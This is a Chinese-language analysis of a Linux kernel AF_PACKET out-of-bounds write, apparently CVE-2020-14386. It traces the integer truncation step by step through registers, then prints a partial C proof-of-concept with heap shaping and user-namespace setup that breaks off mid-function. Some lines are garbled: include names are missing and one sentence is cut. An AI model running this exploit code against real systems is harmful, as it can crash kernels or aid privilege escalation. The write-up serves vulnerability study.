[1]处为下图中红框的执行代码：po->tp_reserve存放在$rbp+0x4e4处，赋给
esi寄存器，值为0xffb4，得到的maclen为0xe，保存在edx寄存器中，经过`(maclen tp_hdrlen的值，为0x43，所以最后经过处理`po->tp_hdrlen + (maclen tp_reserve的值0xfffb4，得到0xfffb4+0x50=0x10004，但因为netoff是unsigned
short类型，所以通过ax寄存器传递，造成了截断，此时netoff=0x4。
进入[2] 处前会进入一个判断：
    if (po->has_vnet_hdr) {
          netoff += sizeof(struct virtio_net_hdr);
          do_vnet = true;
    }
virtio_net_hdr结构大小为0xa，所以netoff变成0x4+0xa=0xe。
进入[2]处：
    macoff = netoff - maclen;
macoff = 0xe - 0xe =0x0。
进入[3]处：
    if (do_vnet &&
            virtio_net_hdr_from_skb(skb, h.raw + macoff -                        sizeof(struct virtio_net_hdr),
                        vio_le(), true, 0)) {
virtio_net_hdr_from_skb 函数实现如下：
    static inline int virtio_net_hdr_from_skb(const struct sk_buff *skb,
                          struct virtio_net_hdr *hdr,
                          bool little_endian,
                          bool has_data_valid,
                          int vlan_hlen)
    {
        memset(hdr, 0, sizeof(*hdr));   /* no info leak */
        if (skb_is_gso(skb)) {
            struct skb_shared_info *sinfo = skb_shinfo(skb);
            /* This is a hint as to how much should be linear. */
            hdr->hdr_len = __cpu_to_virtio16(little_endian,
                             skb_headlen(skb));
            hdr->gso_size = __cpu_to_virtio16(little_endian,
                              sinfo->gso_size);
            if (sinfo->gso_type & SKB_GSO_TCPV4)
                hdr->gso_type = VIRTIO_NET_HDR_GSO_TCPV4;
            else if (sinfo->gso_type & SKB_GSO_TCPV6)
                hdr->gso_type = VIRTIO_NET_HDR_GSO_TCPV6;
            else
                return -EINVAL;
            if (sinfo->gso_type & SKB_GSO_TCP_ECN)
                hdr->gso_type |= VIRTIO_NET_HDR_GSO_ECN;
        } else
            hdr->gso_type = VIRTIO_NET_HDR_GSO_NONE;
        if (skb->ip_summed == CHECKSUM_PARTIAL) {
            hdr->flags = VIRTIO_NET_HDR_F_NEEDS_CSUM;
            hdr->csum_start = __cpu_to_virtio16(little_endian,
                skb_checksum_start_offset(skb) + vlan_hlen);
            hdr->csum_offset = __cpu_to_virtio16(little_endian,
                    skb->csum_offset);
        } else if (has_data_valid &&
               skb->ip_summed == CHECKSUM_UNNECESSARY) {
            hdr->flags = VIRTIO_NET_HDR_F_DATA_VALID;
        } /* else everything is zero */
        return 0;
    }
h.raw地址为0xffffc90000429000，保存在%r10寄存器，macoff经过之前的计算，值为0x0，保存在%rdx寄存器中，virtio_net_hdr结构体大小为0xa，所以经过计算传入的参数hdr
= h.raw + macoff - sizeof(struct virtio_net_hdr) = （0xffffc90000429000 + 0*1）-0xa =
0xffffc90000428ff6，因为0xffffc90000428ff6地址未被映射，无法访问，而进入virtio_net_hdr_from_skb函数后对hdr地址有个初始化操作，所以由于访问错误
do_page_fault 造成crash。
漏洞限制：
该漏洞需要程序拥有CAP_NET_RAW权限，并且只能向上越界写1~10个字节。因为越界写处： virtio_net_hdr_from_skb(skb,
h.raw + macoff - sizeof(struct virtio_net_hdr), vio_le(), true, 0)，要往h.raw
之前的地址写，需要加上一个负数，而macoff为unsigned
short类型，最小值为0，所以最多减去一个virtio_net_hdr结构大小（为0xa个字节大小）。
Poc代码：
    /* Taken from https://www.openwall.com/lists/oss-security/2020/09/03/3 */
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define KMALLOC_PAD     512
    #define PAGEALLOC_PAD       1024
    void packet_socket_rx_ring_init(int s, unsigned int block_size,
            unsigned int frame_size, unsigned int block_nr) {
        int v = TPACKET_V2;
        int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
        if (rv < 0) {
            perror("[-] setsockopt(PACKET_VERSION)");
            exit(EXIT_FAILURE);
        }
        v = 1;
        rv = setsockopt(s, SOL_PACKET, PACKET_VNET_HDR, &v, sizeof(v));
        if (rv < 0)
        {
            perror("setsockopt(PACKET_VNET_HDR)\n");
            return 1;
        }
        v = 0xffff - 20 - 0x30 -7; //0xffb4
        rv = setsockopt(s, SOL_PACKET, PACKET_RESERVE, &v, sizeof(v));
        if (rv < 0)
        {
            perror("setsockopt(PACKET_RESERVE)\n");
            return 1;
        }
        struct tpacket_req req;
        memset(&req, 0, sizeof(req));
        req.tp_block_size = block_size;
        req.tp_frame_size = frame_size;
        req.tp_block_nr = block_nr;
        req.tp_frame_nr = (block_size * block_nr) / frame_size;
        rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
        if (rv < 0) {
            perror("[-] setsockopt(PACKET_RX_RING)");
            exit(EXIT_FAILURE);
        }
    }
    int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
            unsigned int block_nr) {
        int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
        if (s < 0) {
            perror("[-] socket(AF_PACKET)");
            exit(EXIT_FAILURE);
        }
        packet_socket_rx_ring_init(s, block_size, frame_size, block_nr);
        struct sockaddr_ll sa;
        memset(&sa, 0, sizeof(sa));
        sa.sll_family = PF_PACKET;
        sa.sll_protocol = htons(ETH_P_ALL);
        sa.sll_ifindex = if_nametoindex("lo");
        sa.sll_hatype = 0;
        sa.sll_pkttype = 0;
        sa.sll_halen = 0;
        int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
        if (rv < 0) {
            perror("[-] bind(AF_PACKET)");
            exit(EXIT_FAILURE);
        }
        return s;
    }
    // * * * * * * * * * * * * * * Heap shaping * * * * * * * * * * * * * * * * *
    int packet_sock_kmalloc() {
        int s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
        if (s == -1) {
            perror("[-] socket(SOCK_DGRAM)");
            exit(EXIT_FAILURE);
        }
        return s;
    }
    void kmalloc_pad(int count) {
        int i;
        for (i = 0; i < count; i++)
            packet_sock_kmalloc();
    }
    void pagealloc_pad(int count) {
        packet_socket_setup(0x8000, 2048, count);
    }
    bool write_file(const char* file, const char* what, ...) {
        char buf[1024];
        va_list args;
        va_start(args, what);
        vsnprintf(buf, sizeof(buf), what, args);
        va_end(args);
        buf[sizeof(buf) - 1] = 0;
        int len = strlen(buf);
        int fd = open(file, O_WRONLY | O_CLOEXEC);
        if (fd == -1)
            return false;
        if (write(fd, buf, len) != len) {
            close(fd);
            return false;
        }
        close(fd);
        return true;
    }
    void setup_unshare() {
        int real_uid = getuid();
        int real_gid = getgid();
            if (unshare(CLONE_NEWUSER) != 0) {
            perror("[-] unshare(CLONE_NEWUSER)");
            exit(EXIT_FAILURE);
        }
            if (unshare(CLONE_NEWNET) != 0) {
            perror("[-] unshare(CLONE_NEWNET)");
            exit(EXIT_FAILURE);
        }
        if (!write_file("/proc/self/setgroups", "deny")) {
            perror("[-] write_file(/proc/self/set_groups)");
            exit(EXIT_FAILURE);
        }
        if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)){
            perror("[-] write_file(/proc/self/uid_map)");
            exit(EXIT_FAILURE);
        }